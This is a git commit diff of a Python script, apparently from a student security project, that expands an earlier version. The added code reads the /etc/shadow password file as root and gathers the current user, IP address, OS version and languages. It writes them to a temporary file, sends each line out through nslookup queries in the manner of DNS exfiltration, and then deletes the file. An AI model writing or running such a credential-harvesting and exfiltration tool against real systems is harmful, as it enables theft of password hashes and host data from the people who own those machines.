c4cefb66e504359fa87b43c89c055a4d0633f605
Ebarashi <eilon.barashi@msmail.ariel.ac.il>
2022-11-29 02:42:23 +0200

    done get datails and dns - stage 1+2

--- get_details.py
+++ get_details.py
@@ -1,27 +1,85 @@
 import os
 
-# shadow file
-# change the current directory
-os.chdir('/etc')
-# print("Current working directory: {0}".format(os.getcwd()))
 
-if os.geteuid() != 0:
-    print("Err. You are not root.")
+# take from the data the necessary lines - ip address
+def ip(string: str):
+    array = string.split(" ")
+    outF = open("script.txt", "a")
+    outF.write(array.pop(0))
+    outF.write(array.pop(1))
+    outF.write("\n")
+    outF.close()
 
-# get the password file
-with open("shadow", "r") as f:
-    f.seek(0)  # from the begining of the file
-    print("*******************")
-    print("SHADOW FILE")
-    print("*******************")
-    print(f.read())
 
-# other information we want:
-cmd = ['whoami', 'ifconfig', 'hostnamectl', 'locale']  # user, ip, os information, language
-for c in cmd:
-    os.popen(c,'w')  # write throwgh cmd
-    data = os.popen(c).read()  # read from cmd
-    print("*******************")
-    print(c)
-    print("*******************")
-    print(data)
+# take from the data the necessary lines - languages
+def lan(string: str):
+    array = string.split(" ")
+    outF = open("script.txt", "a")
+    for word in array:
+        outF.write(word)
+        outF.write("\n")
+    outF.close()
+
+
+# take from the data the necessary lines - os
+def ops(string: str):
+    array = string.split(" ")
+    outF = open("script.txt", "a")
+    for word in array:
+        outF.write(word)
+        outF.write("\n")
+    outF.close()
+
+
+if __name__ == "__main__":
+
+    # shadow file - password file
+    os.chdir('/etc')
+
+    if os.geteuid() != 0:
+        print("Err. You are not root.")
+
+    outF = open("script.txt", "a")
+    # get the password file
+    with open("shadow", "r") as f:
+        print("*******************")
+        print("PASSWORD FILE")
+        print("*******************")
+        sh_lines = f.readlines()
+        print(sh_lines)
+        print("\n")
+        for line in sh_lines:
+            line.replace(" ", "")
+            outF.write(line)
+            outF.write("\n")
+
+    # other information we want:
+    cmd = ['whoami', 'hostname -I', 'lsb_release -a', 'locale -a']  # user, ip, os information, language
+    Title = ["Current User", "IP", "OS Version", "available languages"]
+    i = 0
+    for c in cmd:
+        print("*******************")
+        print(Title[i])
+        print("*******************\n")
+        os.popen(c, 'w')  # write to cmd
+        i = i + 1
+        data = os.popen(c).readlines()  # read from cmd
+        for line in data:
+            if c == "hostname -I":
+                ip(line)
+            if c == "locale -a":
+                lan(line)
+            if c == "lsb_release -a":
+                ops(line)
+            if c == "whoami":
+                outF = open("script.txt", "a")
+                outF.write(line)
+                outF.write("\n")
+                outF.close()
+
+    outF = open("script.txt", "r")
+    lines = outF.readlines()
+    for line in lines:
+        os.popen(f'nslookup {line}.127.0.0.1 +noidnin +noidnout', 'w')
+
+    os.remove("script.txt")
